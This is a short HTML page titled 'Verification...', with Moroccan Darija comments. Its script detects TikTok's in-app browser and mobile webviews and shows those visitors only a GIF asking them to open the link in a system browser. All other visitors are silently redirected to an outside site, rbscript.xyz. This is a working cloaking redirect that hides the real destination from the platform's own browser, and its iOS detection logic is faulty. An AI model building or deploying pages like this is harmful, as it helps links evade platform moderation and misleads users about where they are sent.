<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: sans-serif;
            overflow: hidden;
        }
        #content {
            display: none; /* Makhbi par defaut */
            text-align: center;
            width: 100%;
        }
        img {
            max-width: 100%;
            height: auto;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <div id="content">
        <img src="images/tiktokredirect.gif" alt="Please Open in System Browser">
    </div>

    <script>
        function runRedirect() {
            var ua = navigator.userAgent.toLowerCase();
            
            // 1. Detection dyal TikTok (Standard)
            var isTikTok = ua.indexOf("tiktok") > -1 || ua.indexOf("bytedance") > -1;

            // 2. Detection dyal WebView f Android (Browser dakhili dyal Apps)
            // L-browser dyal TikTok f Android 3ando "wv" f user agent
            var isAndroidWebView = ua.indexOf("android") > -1 && ua.indexOf("wv") > -1;

            // 3. Detection dyal iOS WebView (iPhone)
            // F iPhone, ila kan "Safari" walakin ma fihch "Version/", rah in-app browser
            var isIosWebView = (ua.indexOf("iphone") > -1 || ua.indexOf("ipad") > -1) && 
                               (ua.indexOf("safari") === -1 || ua.indexOf("crios") === -1);

            // Daba l-hakam: Wach hada browser "masjoune" (TikTok/Insta/WebView)?
            var isInAppBrowser = isTikTok || isAndroidWebView || isIosWebView;

            if (isInAppBrowser) {
                // HADA TIKTOK: Bayen l-GIF w matdirch redirect
                document.getElementById('content').style.display = 'block';
            } else {
                // HADA CHROME/SAFARI: Sifto nichan l site lakhor
                window.location.replace("https://rbscript.xyz");
            }
        }

        // Lancer l-process
        runRedirect();
    </script>

</body>
</html>
